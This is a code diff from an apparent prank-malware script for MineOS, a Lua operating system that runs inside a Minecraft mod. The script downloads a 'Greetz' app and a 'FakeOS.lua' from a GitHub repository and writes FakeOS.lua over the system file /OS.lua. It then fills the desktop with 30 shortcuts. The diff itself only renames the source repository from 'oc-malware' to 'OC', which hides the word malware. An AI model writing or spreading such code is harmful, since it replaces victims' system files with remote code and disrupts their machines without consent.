@@ -25,11 +25,11 @@ function FUN()
   local cdir = fs.path(system.getCurrentScript())
   
   fs.makeDirectory("/MineOS/Greetz.app")
-  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/Greetz.app/Icon.pic","/MineOS/Greetz.app/Icon.pic")
-  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/Greetz.app/Main.lua","/MineOS/Greetz.app/Main.lua")
+  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/Greetz.app/Icon.pic","/MineOS/Greetz.app/Icon.pic")
+  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/Greetz.app/Main.lua","/MineOS/Greetz.app/Main.lua")
   
   
-  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/FakeOS.lua","/OS.lua")
+  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/FakeOS.lua","/OS.lua")
   
   for i = 1,30 do
     system.createShortcut(paths.user.desktop .. "GREETZ " .. tostring(i),"/MineOS/Greetz.app/")
@@ -126,7 +126,7 @@ if ops["restore"] then
   internet.download("https://raw.githubusercontent.com/IgorTimofeev/MineOS/master/OS.lua","/OS.lua")
   print("Restoring complete")
   print(" ")
-  print("You have to follow the instuctions at https://github.com/ocboy3/oc-malware/README.md")
+  print("You have to follow the instuctions at https://github.com/ocboy3/OC/README.md")
   print("Please restart your computer manually. (just in case)")
 else
 
